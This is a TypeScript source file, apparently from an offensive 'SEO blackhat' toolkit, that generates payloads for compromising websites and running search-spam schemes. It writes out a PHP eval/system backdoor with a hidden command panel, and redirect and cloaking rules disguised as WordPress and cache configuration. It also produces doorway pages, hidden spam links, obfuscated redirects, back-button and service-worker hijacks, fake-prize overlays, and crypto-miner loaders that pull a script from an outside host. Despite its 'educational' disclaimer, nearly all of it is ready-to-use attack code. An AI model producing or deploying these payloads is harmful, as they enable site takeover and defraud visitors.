/**
 * SEO BLACKHAT MODE Engine — Full Attack Chain Analysis
 * Ported from seo_engine.py (Friday SecTools v28.7)
 * 
 * 16+ Capabilities across 5 Phases + Defense Detection
 * Educational / authorized penetration testing only.
 */
import { invokeLLM } from "./_core/llm";
import crypto from "crypto";

// ═══════════════════════════════════════════════════════
//  CONSTANTS & SIGNATURES
// ═══════════════════════════════════════════════════════

const SEARCH_BOTS = [
  "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
  "YandexBot", "Sogou", "facebot", "ia_archiver", "Applebot",
  "AhrefsBot", "SemrushBot", "MJ12bot", "DotBot", "PetalBot",
];

const SPAM_NICHES = [
  "cheap-pharmacy", "online-casino", "payday-loans",
  "replica-watches", "weight-loss-pills", "free-crypto",
  "cheap-insurance", "adult-dating", "essay-writing",
  "seo-services", "vpn-deals", "forex-trading",
];

const SPAM_TLDS = [".buzz", ".click", ".top", ".xyz", ".win", ".loan", ".gq", ".tk", ".ml", ".cf"];

const TDS_DESTINATIONS: Record<string, { url: string; weight: number }> = {
  casino: { url: "https://casino-offers.example.com", weight: 25 },
  pharmacy: { url: "https://pharmacy-deals.example.com", weight: 20 },
  crypto: { url: "https://crypto-invest.example.com", weight: 15 },
  dating: { url: "https://dating-site.example.com", weight: 15 },
  gambling: { url: "https://sports-bet.example.com", weight: 10 },
  loans: { url: "https://fast-loans.example.com", weight: 10 },
  sweepstake: { url: "https://you-won.example.com", weight: 5 },
};

const IMPLANT_TARGETS = [
  "index.php", "index.html", "header.php", "footer.php",
  "wp-config.php", "wp-blog-header.php", "wp-load.php",
  "wp-includes/version.php", "wp-content/themes/*/functions.php",
  "config.php", "config/app.php", "settings.php",
  ".htaccess", "web.config", "nginx.conf",
];

const GOOGLE_IP_PREFIXES = ["66.249.", "64.233.", "72.14.", "209.85.", "216.239.", "74.125.", "108.177.", "142.250."];

const PARASITE_PLATFORMS = {
  subdomain_takeover: ["sites.google.com", "*.blogspot.com", "*.wordpress.com", "*.github.io", "*.herokuapp.com", "*.netlify.app"],
  ugc_abuse: ["medium.com", "notion.so", "docs.google.com", "issuu.com", "slideshare.net", "quora.com", "reddit.com"],
  open_redirect: ["google.com/url?q=", "facebook.com/l.php?u=", "youtube.com/redirect?q=", "linkedin.com/redir/redirect?url="],
};

const EXPIRED_TLDS = [".com", ".net", ".org", ".info", ".biz", ".co", ".io"];

const TOXIC_LINK_SOURCES = [
  "forum-spam-{n}.example.com", "link-farm-{n}.example.com",
  "porn-links-{n}.example.com", "casino-dir-{n}.example.com",
  "pharma-blog-{n}.example.com", "warez-site-{n}.example.com",
  "auto-blog-{n}.example.com", "scraper-site-{n}.example.com",
];

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface Payload {
  type: string;
  technique?: string;
  code?: string;
  size?: number;
  features?: string[];
  effect?: string;
  [key: string]: unknown;
}

export interface PhaseResult {
  phase: number;
  name: string;
  capabilities: string[];
  payloads: Payload[];
  summary: string;
  riskLevel: number;
}

export interface DetectionResult {
  indicator: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  description: string;
  recommendation: string;
}

export interface FullChainReport {
  targetDomain: string;
  redirectUrl: string;
  phases: PhaseResult[];
  detection: DetectionResult[];
  totalPayloads: number;
  totalPages: number;
  totalImplants: number;
  totalGates: number;
  totalParasites: number;
  totalNegativeAttacks: number;
  totalRedirectChains: number;
  totalDetections: number;
  aiAnalysis?: string;
  elapsed: number;
}

// ═══════════════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function md5(str: string): string {
  return crypto.createHash("md5").update(str).digest("hex");
}

function sha256(str: string): string {
  return crypto.createHash("sha256").update(str).digest("hex");
}

function getDomain(url: string): string {
  try {
    return new URL(url.startsWith("http") ? url : `https://${url}`).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0];
  }
}

function ensureUrl(domain: string): string {
  return domain.startsWith("http") ? domain : `https://${domain}`;
}

// ═══════════════════════════════════════════════════════
//  PHASE 1: WEB COMPROMISE & INJECTION
// ═══════════════════════════════════════════════════════

export function webImplant(targetUrl: string): Payload[] {
  const payloads: Payload[] = [];
  const domain = getDomain(targetUrl);

  // PHP backdoor implant
  const phpBackdoor = `<?php
// Performance monitor
if(isset($_GET['_perf'])){
  @eval(base64_decode($_GET['_perf']));
  exit;
}
// Hidden admin panel
if(isset($_COOKIE['_admin_session'])){
  echo '<form method="POST"><textarea name="c" cols="80" rows="20"></textarea>';
  echo '<br><input type="submit" value="Execute"></form>';
  if(isset($_POST['c'])){@system($_POST['c']);}
  exit;
}
?>`;
  payloads.push({
    type: "php_backdoor_implant",
    code: phpBackdoor,
    size: phpBackdoor.length,
    technique: "Hidden PHP eval backdoor with cookie-gated admin panel",
    targets: IMPLANT_TARGETS.filter(f => f.endsWith(".php")),
  });

  // WordPress functions.php injection
  const wpInject = `<?php
// Theme optimization hooks
add_action('wp_head', function(){
  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
  if(preg_match('/googlebot|bingbot|slurp/i', $ua)){
    echo '<meta name="description" content="Best online deals - pharmacy, casino, loans">';
    echo '<link rel="canonical" href="https://spam-destination.example.com/">';
  }
});
add_action('wp_footer', function(){
  echo '<div style="position:absolute;left:-9999px;font-size:0">';
  echo '<a href="https://casino-spam.example.com">Best Casino</a>';
  echo '<a href="https://pharma-spam.example.com">Cheap Pharmacy</a>';
  echo '</div>';
});
?>`;
  payloads.push({
    type: "wp_functions_inject",
    code: wpInject,
    size: wpInject.length,
    technique: "WordPress functions.php hook injection (wp_head + wp_footer)",
    features: ["bot_meta_injection", "hidden_link_footer", "canonical_hijack"],
  });

  // .htaccess implant
  const htaccessImplant = `# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
# Cache optimization
RewriteCond %{HTTP_USER_AGENT} !(Googlebot|Bingbot) [NC]
RewriteCond %{HTTP_REFERER} (google\\.com|bing\\.com|yahoo\\.com) [NC]
RewriteRule ^(.*)$ https://spam-destination.example.com/gate?r=$1 [R=302,L]
RewriteRule ^index\\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress`;
  payloads.push({
    type: "htaccess_implant",
    code: htaccessImplant,
    size: htaccessImplant.length,
    technique: ".htaccess redirect injection disguised as WordPress rules",
    features: ["search_referrer_redirect", "bot_exclusion"],
  });

  return payloads;
}

export function configPoison(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];
  const botList = SEARCH_BOTS.slice(0, 8).join("|").toLowerCase();

  // .htaccess full chain
  const htaccessFull = `# BEGIN Performance Cache
<IfModule mod_rewrite.c>
RewriteEngine On
# Serve normal content to bots
RewriteCond %{HTTP_USER_AGENT} (${SEARCH_BOTS.slice(0, 6).join("|")}) [NC]
RewriteRule ^.*$ - [L]
# Redirect search-referred humans to gate
RewriteCond %{HTTP_REFERER} (google\\.com|bing\\.com|yahoo\\.com|duckduckgo\\.com) [NC]
RewriteCond %{HTTP_COOKIE} !_seen=1
RewriteRule ^(.*)$ ${redirectUrl}/gate?r=$1&ref=%{HTTP_REFERER} [R=302,L]
# Serve doorway pages for specific spam paths
RewriteRule ^cheap-(.*)$ /wp-content/cache/pages/$1.html [L]
RewriteRule ^buy-(.*)$ /wp-content/cache/pages/$1.html [L]
RewriteRule ^best-(.*)$ /wp-content/cache/pages/$1.html [L]
</IfModule>
# END Performance Cache`;
  payloads.push({
    type: "htaccess_full_chain",
    code: htaccessFull,
    size: htaccessFull.length,
    technique: ".htaccess full chain: bot cloaking + search referrer redirect + doorway routing",
    features: ["bot_cloaking", "search_referrer_redirect", "cookie_tracking", "doorway_routing"],
  });

  // nginx.conf poison
  const nginxPoison = `# CDN cache rules
map $http_user_agent $is_crawler {
    default 0;
    "~*googlebot"   1;
    "~*bingbot"     1;
    "~*slurp"       1;
    "~*yandexbot"   1;
}
map $http_referer $from_search {
    default 0;
    "~*google\\.com"  1;
    "~*bing\\.com"    1;
}
server {
    if ($is_crawler) { rewrite ^/(.*)$ /cache/doorway/$1.html break; }
    if ($from_search) { return 302 ${redirectUrl}/gate?r=$request_uri; }
}`;
  payloads.push({
    type: "nginx_map_redirect",
    code: nginxPoison,
    size: nginxPoison.length,
    technique: "nginx map-based cloaking + referrer redirect",
    features: ["nginx_map_cloaking", "referrer_redirect"],
  });

  // PHP auto_prepend output buffer hijack
  const phpPrepend = `<?php
// Cache warming script
$__u = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$__r = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$__bots = '/googlebot|bingbot|slurp|yandex|baidu/i';
if (preg_match($__bots, $__u)) {
    ob_start(function($buf) {
        $spam_meta = '<meta name="description" content="Buy cheap medications online - 90% discount">';
        $spam_title = '<title>Best Online Pharmacy Deals 2025</title>';
        $buf = preg_replace('/<title>.*?<\\/title>/si', $spam_title, $buf, 1);
        $buf = str_replace('</head>', $spam_meta . '</head>', $buf);
        return $buf;
    });
} elseif (preg_match('/google\\.|bing\\.|yahoo\\./i', $__r)) {
    header('Location: ${redirectUrl}/gate', true, 302);
    exit;
}
?>`;
  payloads.push({
    type: "php_output_buffer_hijack",
    code: phpPrepend,
    size: phpPrepend.length,
    technique: "PHP output buffer callback hijack: bot meta injection + human redirect",
    features: ["ob_callback_hijack", "meta_injection_for_bots", "referrer_redirect_for_humans"],
  });

  return payloads;
}

export function cloakedRedirect(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];
  const botRegex = SEARCH_BOTS.slice(0, 8).join("|").toLowerCase();

  // PHP UA-based cloaker
  payloads.push({
    type: "php_ua_cloak",
    technique: "User-Agent detection: bots see spam content, humans see original",
    code: `<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = '/${botRegex}/i';
if (preg_match($bots, $ua)) {
    echo '<html><head><title>Best Pharmacy Deals Online</title>';
    echo '<meta name="description" content="Buy cheap medications online">';
    echo '</head><body><h1>Discount Pharmacy - Up to 90% Off</h1>';
    echo '<a href="${redirectUrl}">Click here for deals</a></body></html>';
} else {
    include('original_index.php');
}
?>`,
    features: ["ua_detection", "bot_content_swap"],
  });

  // IP-based cloaker
  payloads.push({
    type: "php_ip_cloak",
    technique: "IP range detection: Google crawler IPs get spam content",
    code: `<?php
$bot_ranges = [${GOOGLE_IP_PREFIXES.map(p => `'${p}'`).join(", ")}];
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$is_bot = false;
foreach ($bot_ranges as $r) { if (strpos($ip, $r) === 0) { $is_bot = true; break; } }
if ($is_bot) {
    header('HTTP/1.1 200 OK');
    echo '<html><body><h1>Cheap Online Deals</h1><a href="${redirectUrl}">Visit our store</a></body></html>';
} else {
    header("Location: /real-page.html", true, 302);
}
?>`,
    features: ["ip_range_detection", "google_ip_targeting"],
  });

  // JavaScript render-based cloaker
  payloads.push({
    type: "js_render_cloak",
    technique: "JavaScript rendering: bots can't execute JS, see static spam; humans get redirected",
    code: `<noscript>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
</noscript>
<div id="seo-content" style="display:block">
<h1>Best Online Deals 2025</h1>
<p>Cheap pharmacy, casino bonuses, payday loans...</p>
</div>
<script>
document.getElementById('seo-content').style.display='none';
// Human: load real page
fetch('/api/real-content').then(r=>r.text()).then(h=>{document.body.innerHTML=h});
</script>`,
    features: ["noscript_redirect", "js_content_swap"],
  });

  return payloads;
}

export function doorwayGen(targetUrl: string, count: number = 10, niche?: string): Payload[] {
  const payloads: Payload[] = [];
  const cities = ["new-york", "london", "tokyo", "sydney", "berlin", "paris", "toronto", "mumbai", "singapore", "dubai"];
  const selectedNiche = niche || randomChoice(SPAM_NICHES);

  for (let i = 0; i < count; i++) {
    const city = randomChoice(cities);
    const slug = `${selectedNiche}-${city}-deals-${randomInt(1000, 9999)}`;
    const title = `Best ${selectedNiche.replace(/-/g, " ")} in ${city.replace(/-/g, " ")} - ${randomInt(50, 90)}% Off`;
    
    const page = `<!DOCTYPE html>
<html><head>
<title>${title}</title>
<meta name="description" content="${title} - Exclusive deals and offers">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${ensureUrl(targetUrl)}/${slug}/">
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Product","name":"${title}",
"offers":{"@type":"Offer","price":"${randomInt(1, 99)}.99","priceCurrency":"USD"}}
</script>
</head><body>
<h1>${title}</h1>
<p>Find the best ${selectedNiche.replace(/-/g, " ")} deals in ${city.replace(/-/g, " ")}. Limited time offer!</p>
<a href="https://spam-destination.example.com/${selectedNiche}">Get Deal Now</a>
</body></html>`;

    payloads.push({
      type: "doorway_page",
      slug,
      title,
      code: page,
      size: page.length,
      technique: `Doorway page: ${selectedNiche} + ${city} geo-targeting with structured data`,
      niche: selectedNiche,
      city,
    });
  }

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 2: SEARCH ENGINE MANIPULATION
// ═══════════════════════════════════════════════════════

export function sitemapPoison(targetUrl: string, count: number = 50): Payload[] {
  const payloads: Payload[] = [];
  const target = ensureUrl(targetUrl);
  const urls: string[] = [];
  const cities = ["new-york", "london", "tokyo", "sydney", "berlin", "paris", "toronto", "mumbai"];

  for (let i = 0; i < count; i++) {
    const niche = randomChoice(SPAM_NICHES);
    const city = randomChoice(cities);
    const slug = `${niche}-${city}-deals-${randomInt(1000, 9999)}`;
    urls.push(`${target.replace(/\/$/, "")}/${slug}/`);
  }

  const today = new Date().toISOString().split("T")[0];
  let sitemapXml = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n';
  for (const url of urls) {
    sitemapXml += `  <url><loc>${url}</loc><lastmod>${today}</lastmod><changefreq>daily</changefreq><priority>0.9</priority></url>\n`;
  }
  sitemapXml += "</urlset>\n";

  payloads.push({
    type: "sitemap_poison",
    code: sitemapXml,
    size: sitemapXml.length,
    urls: urls.length,
    sampleUrls: urls.slice(0, 5),
    technique: `Poisoned sitemap.xml with ${count} spam URLs targeting multiple niches/cities`,
  });

  return payloads;
}

export function indexManipulate(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  // JSON-LD structured data injection
  const jsonld = `<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Product",
  "name": "Premium Casino Bonus - 500% Welcome Offer",
  "description": "Best online casino with instant payouts and VIP rewards",
  "brand": {"@type": "Brand", "name": "LuckyStar Casino"},
  "offers": {
    "@type": "Offer", "price": "0", "priceCurrency": "USD",
    "availability": "https://schema.org/InStock",
    "url": "${redirectUrl}/casino-bonus"
  },
  "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.9", "reviewCount": "12847"}
}
</script>`;
  payloads.push({
    type: "jsonld_structured_data",
    code: jsonld,
    size: jsonld.length,
    technique: "JSON-LD injection: fake product with 4.9★ rating appears in rich snippets",
    effect: "Rich snippet in search results with fake reviews/ratings",
  });

  // robots.txt manipulation
  const robotsPoison = `User-agent: *
Allow: /

User-agent: Googlebot
Allow: /wp-content/cache/pages/
Allow: /cheap-*
Allow: /buy-*
Allow: /best-*

Sitemap: /sitemap.xml
Sitemap: /sitemap-offers.xml
Sitemap: /sitemap-deals.xml`;
  payloads.push({
    type: "robots_txt_manipulation",
    code: robotsPoison,
    size: robotsPoison.length,
    technique: "robots.txt: explicitly allow bots to crawl doorway pages + multiple spam sitemaps",
    effect: "Bots crawl and index doorway pages",
  });

  // IndexNow API abuse
  const indexNowKey = md5("friday-indexnow").substring(0, 32);
  const indexNowPayload = JSON.stringify({
    host: getDomain(targetUrl),
    key: indexNowKey,
    keyLocation: `https://${getDomain(targetUrl)}/indexnow-key.txt`,
    urlList: SPAM_NICHES.slice(0, 5).map(n => `https://${getDomain(targetUrl)}/${n}-deals`),
  }, null, 2);
  payloads.push({
    type: "indexnow_abuse",
    code: indexNowPayload,
    size: indexNowPayload.length,
    technique: "IndexNow API abuse: force instant indexing of spam pages",
    effect: "Bing/Yandex immediately crawl and index spam URLs",
  });

  // Hreflang injection
  const langs = ["en", "es", "fr", "de", "ja", "zh", "ru", "ar"];
  const hreflang = langs.map(l => `<link rel="alternate" hreflang="${l}" href="${redirectUrl}/${l}/">`).join("\n");
  payloads.push({
    type: "hreflang_spam",
    code: hreflang,
    size: hreflang.length,
    technique: `Hreflang injection: ${langs.length} language variants pointing to spam`,
    languages: langs.length,
  });

  return payloads;
}

export function linkSpam(targetUrl: string, count: number = 20): Payload[] {
  const payloads: Payload[] = [];

  // Hidden link block
  let hiddenBlock = '<div style="position:absolute;left:-9999px;font-size:0">\n';
  const links: Array<{ anchor: string; url: string }> = [];
  for (let i = 0; i < count; i++) {
    const niche = randomChoice(SPAM_NICHES);
    const kw = niche.replace(/-/g, " ").replace(/\b\w/g, c => c.toUpperCase());
    const tld = randomChoice(SPAM_TLDS);
    const url = `https://${niche}${tld}/`;
    hiddenBlock += `  <a href="${url}">${kw} Deals</a>\n`;
    links.push({ anchor: `${kw} Deals`, url });
  }
  hiddenBlock += "</div>\n";
  payloads.push({
    type: "hidden_link_block",
    code: hiddenBlock,
    size: hiddenBlock.length,
    links: count,
    technique: `CSS-hidden link block: ${count} spam links invisible to users, visible to crawlers`,
  });

  // Comment spam templates
  const templates = [
    "Great article! Also check out {url} for amazing {niche} deals.",
    "Thanks for sharing! I found {url} very helpful for {niche}.",
    "Very informative. Visit {url} - best {niche} service I've used.",
    "Nice post! Related: {url} has excellent {niche} offers.",
  ];
  const comments = [];
  for (let i = 0; i < Math.min(count, 10); i++) {
    const niche = randomChoice(SPAM_NICHES).replace(/-/g, " ");
    const tld = randomChoice(SPAM_TLDS);
    const url = `https://${niche.replace(/ /g, "-")}${tld}/`;
    const tpl = randomChoice(templates);
    comments.push({ text: tpl.replace("{url}", url).replace("{niche}", niche), url });
  }
  payloads.push({
    type: "comment_spam",
    templates: comments.length,
    samples: comments.slice(0, 5),
    technique: "Comment spam templates with natural-looking text + spam URLs",
  });

  // Footer injection
  let footerInject = '\n<!-- analytics -->\n<div style="font-size:1px;color:transparent;overflow:hidden;height:1px">\n';
  for (const niche of SPAM_NICHES.slice(0, 8)) {
    const tld = randomChoice(SPAM_TLDS);
    footerInject += `<a href="https://${niche}${tld}/">${niche.replace(/-/g, " ")}</a> `;
  }
  footerInject += "\n</div>\n<!-- /analytics -->\n";
  payloads.push({
    type: "footer_inject",
    code: footerInject,
    size: footerInject.length,
    technique: "Footer injection: 1px transparent div with spam links disguised as analytics",
  });

  return payloads;
}

export function metaHijack(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  payloads.push({
    type: "meta_refresh_0",
    code: `<meta http-equiv="refresh" content="0;url=${redirectUrl}">`,
    technique: "Instant meta refresh redirect (0-second delay)",
  });

  payloads.push({
    type: "meta_refresh_5s",
    code: `<meta http-equiv="refresh" content="5;url=${redirectUrl}">\n<p>Page moved. Redirecting in 5 seconds... <a href="${redirectUrl}">Click here</a></p>`,
    technique: "5-second meta refresh with social engineering message",
  });

  payloads.push({
    type: "canonical_hijack",
    code: `<link rel="canonical" href="${redirectUrl}/">`,
    technique: "Canonical tag hijack: steal SEO value → redirect to spam domain",
    effect: "Search engines transfer page authority to spam domain",
  });

  payloads.push({
    type: "og_hijack",
    code: `<meta property="og:url" content="${redirectUrl}/">\n<meta property="og:title" content="Amazing Deals">\n<meta property="og:description" content="Best offers online">`,
    technique: "Open Graph metadata hijack: social shares show spam content",
  });

  const hreflang = ["en", "es", "fr", "de", "ja", "zh", "ru", "ar"]
    .map(l => `<link rel="alternate" hreflang="${l}" href="${redirectUrl}/${l}/">`)
    .join("\n");
  payloads.push({
    type: "hreflang_spam",
    code: hreflang,
    technique: "Hreflang injection: 8 language variants all pointing to spam domain",
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 3: USER CLICK → CONDITIONAL REDIRECT
// ═══════════════════════════════════════════════════════

export function conditionalRedirect(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  // Geo-based
  payloads.push({
    type: "php_geo_redirect",
    code: `<?php
$ip = $_SERVER['REMOTE_ADDR'];
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
$target_countries = ['US','GB','CA','AU','DE','FR'];
if ($geo && in_array($geo->countryCode, $target_countries)) {
    header("Location: ${redirectUrl}?geo=" . $geo->countryCode, true, 302);
    exit;
}
?>`,
    technique: "Geo-IP conditional redirect: only US/GB/CA/AU/DE/FR traffic",
    features: ["geo_targeting", "ip_api_lookup"],
  });

  // Time-based
  payloads.push({
    type: "php_time_redirect",
    code: `<?php
$hour = (int)date('G');
if ($hour >= 22 || $hour < 6) {
    header("Location: ${redirectUrl}", true, 302);
    exit;
}
?>`,
    technique: "Off-hours redirect: only 10PM-6AM to avoid admin detection",
    features: ["time_based", "stealth"],
  });

  // Percentage-based
  payloads.push({
    type: "php_percentage_redirect",
    code: `<?php
if (mt_rand(1, 100) <= 30) {
    header("Location: ${redirectUrl}", true, 302);
    exit;
}
?>`,
    technique: "30% traffic redirect: random sampling to avoid detection",
    features: ["percentage_sampling", "stealth"],
  });

  // Device-based
  payloads.push({
    type: "device_redirect",
    code: `<script>
if(/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)){
    window.location='${redirectUrl}';
}
</script>`,
    technique: "Mobile-only redirect: target mobile users (higher conversion for spam)",
  });

  return payloads;
}

export function jsInject(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  // Delayed redirect
  payloads.push({
    type: "js_delayed_redirect",
    code: `<script>setTimeout(function(){window.location='${redirectUrl}'},${randomInt(3, 8)}000);</script>`,
    technique: `Delayed JS redirect: ${randomInt(3, 8)}s delay to bypass bot detection`,
  });

  // Back-button hijack
  payloads.push({
    type: "js_history_hijack",
    code: `<script>
history.pushState(null, '', location.href);
window.addEventListener('popstate', function(){
    window.location='${redirectUrl}';
});
</script>`,
    technique: "History API back-button hijack: pressing back → redirect to spam",
  });

  // Obfuscated eval
  const raw = `window.location='${redirectUrl}';`;
  const b64 = Buffer.from(raw).toString("base64");
  payloads.push({
    type: "js_obfuscated",
    code: `<script>eval(atob("${b64}"));</script>`,
    technique: "Base64 + eval obfuscation: hides redirect URL from static analysis",
  });

  // Service Worker hijack
  payloads.push({
    type: "js_serviceworker",
    code: `<script>
if('serviceWorker' in navigator){
    navigator.serviceWorker.register('/sw-hijack.js')
    .then(function(){console.log('SW registered')});
}
</script>
<!-- sw-hijack.js intercepts fetch → redirect -->`,
    technique: "Service Worker fetch hijack: persistent redirect even after code removal",
    features: ["persistent", "sw_intercept"],
  });

  return payloads;
}

export function trafficGate(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  // TDS (Traffic Distribution System)
  const tdsRules = Object.entries(TDS_DESTINATIONS).map(([niche, cfg]) => ({
    niche,
    url: cfg.url,
    weight: cfg.weight,
  }));

  payloads.push({
    type: "traffic_distribution_system",
    technique: "Multi-niche TDS gate: weighted random distribution across 7 spam verticals",
    rules: tdsRules,
    totalWeight: tdsRules.reduce((s, r) => s + r.weight, 0),
    code: `<?php
// Traffic Distribution System (TDS)
$destinations = ${JSON.stringify(TDS_DESTINATIONS, null, 2)};
$total = array_sum(array_column($destinations, 'weight'));
$rand = mt_rand(1, $total);
$cumulative = 0;
foreach ($destinations as $niche => $cfg) {
    $cumulative += $cfg['weight'];
    if ($rand <= $cumulative) {
        header("Location: " . $cfg['url'] . "?src=" . urlencode($_SERVER['HTTP_REFERER'] ?? ''), true, 302);
        exit;
    }
}
?>`,
    features: ["weighted_distribution", "multi_niche", "referrer_tracking"],
  });

  // Fingerprint gate
  payloads.push({
    type: "fingerprint_gate",
    technique: "Browser fingerprint gate: collect device info before redirect decision",
    code: `<script>
(function(){
  var fp = {
    screen: screen.width+'x'+screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    cores: navigator.hardwareConcurrency,
    touch: 'ontouchstart' in window,
    webgl: (function(){try{var c=document.createElement('canvas');return c.getContext('webgl').getParameter(c.getContext('webgl').RENDERER)}catch(e){return'none'}})()
  };
  fetch('/api/gate',{method:'POST',body:JSON.stringify(fp)})
  .then(r=>r.json()).then(d=>{if(d.redirect)window.location=d.redirect});
})();
</script>`,
    features: ["browser_fingerprint", "server_decision", "anti_bot"],
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 4: MONETIZATION
// ═══════════════════════════════════════════════════════

export function adInject(targetUrl: string): Payload[] {
  const payloads: Payload[] = [];

  payloads.push({
    type: "popunder_inject",
    technique: "Click-triggered pop-under: opens spam page behind current window",
    code: `<script>
document.addEventListener('click', function(e){
  var w = window.open('https://ad-network.example.com/pop?ref=${getDomain(targetUrl)}','_blank');
  if(w){w.blur();window.focus();}
}, {once:true});
</script>`,
    features: ["popunder", "one_time_trigger"],
  });

  payloads.push({
    type: "overlay_ad",
    technique: "Full-screen overlay ad with delayed close button",
    code: `<div id="ad-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center">
<div style="background:white;padding:40px;border-radius:10px;max-width:500px;text-align:center">
<h2>Congratulations! You've Won!</h2>
<p>Claim your $1000 gift card now</p>
<a href="https://ad-network.example.com/claim" style="background:#ff6600;color:white;padding:15px 30px;border-radius:5px;text-decoration:none;display:inline-block">Claim Now</a>
<p style="margin-top:20px;font-size:11px;color:#999" id="close-timer">Close in 5s...</p>
</div></div>
<script>
var t=5;var i=setInterval(function(){t--;document.getElementById('close-timer').textContent='Close in '+t+'s...';
if(t<=0){clearInterval(i);document.getElementById('close-timer').innerHTML='<a href="#" onclick="document.getElementById(\\'ad-overlay\\').remove();return false">Close</a>';}},1000);
</script>`,
    features: ["fullscreen_overlay", "delayed_close", "social_engineering"],
  });

  payloads.push({
    type: "native_ad_inject",
    technique: "Native ad injection: disguised as related content recommendations",
    code: `<div class="related-posts" style="margin:20px 0;padding:15px;border:1px solid #eee;border-radius:8px">
<h3 style="font-size:14px;color:#666;margin-bottom:10px">Recommended for you</h3>
<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">
<a href="${targetUrl}?ref=native1&utm_source=content" style="text-decoration:none;color:#333">
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='120'%3E%3Crect fill='%23f0f0f0' width='200' height='120'/%3E%3Ctext x='100' y='60' text-anchor='middle' fill='%23999' font-size='12'%3EHealth%3C/text%3E%3C/svg%3E" style="width:100%;border-radius:4px"><p style="font-size:13px;margin-top:5px">Doctors Shocked by New Weight Loss Method</p></a>
<a href="${targetUrl}?ref=native2&utm_source=content" style="text-decoration:none;color:#333">
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='120'%3E%3Crect fill='%23e8f5e9' width='200' height='120'/%3E%3Ctext x='100' y='60' text-anchor='middle' fill='%23999' font-size='12'%3EFinance%3C/text%3E%3C/svg%3E" style="width:100%;border-radius:4px"><p style="font-size:13px;margin-top:5px">This Investment App Made Him a Millionaire</p></a>
<a href="${targetUrl}?ref=native3&utm_source=content" style="text-decoration:none;color:#333">
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='120'%3E%3Crect fill='%23fff3e0' width='200' height='120'/%3E%3Ctext x='100' y='60' text-anchor='middle' fill='%23999' font-size='12'%3ECasino%3C/text%3E%3C/svg%3E" style="width:100%;border-radius:4px"><p style="font-size:13px;margin-top:5px">Online Casino Pays Out $50K Daily</p></a>
</div></div>`,
    features: ["native_content", "grid_layout", "clickbait"],
  });

  return payloads;
}

export function cryptoInject(targetUrl: string): Payload[] {
  const payloads: Payload[] = [];

  payloads.push({
    type: "wasm_miner_loader",
    technique: "WebAssembly crypto miner: 30% CPU throttle to avoid detection",
    code: `<script>
(function() {
    var config = {
        threads: Math.max(1, Math.floor(navigator.hardwareConcurrency * 0.3)),
        throttle: 0.7,
        pool: 'pool.example.com:3333',
        wallet: 'WALLET_ADDRESS',
        password: 'x',
    };
    var s = document.createElement('script');
    s.src = '//cdn-worker.example.com/wasm-miner.min.js';
    s.onload = function() { if(window.Miner) new Miner(config).start(); };
    document.head.appendChild(s);
})();
</script>`,
    features: ["throttled_30pct", "wasm_performance", "external_pool"],
  });

  payloads.push({
    type: "service_worker_miner",
    technique: "Service Worker persistent miner: continues mining after tab close",
    code: `<script>
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw-cache.js', {scope: '/'})
    .then(function(reg) { console.log('Cache worker active'); });
}
// sw-cache.js: importScripts('//cdn-worker.example.com/wasm-miner.min.js'); new Miner({throttle:0.5}).start();
</script>`,
    features: ["persistent_after_tab_close", "sw_background"],
  });

  payloads.push({
    type: "conditional_visibility_miner",
    technique: "Visibility API miner: only mines when tab is active (stealth)",
    code: `<script>
document.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'visible' && window._miner) {
        window._miner.start();
    } else if (window._miner) {
        window._miner.stop();
    }
});
</script>`,
    features: ["visibility_api", "start_stop_on_focus"],
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 5: ADVANCED SEO ATTACKS
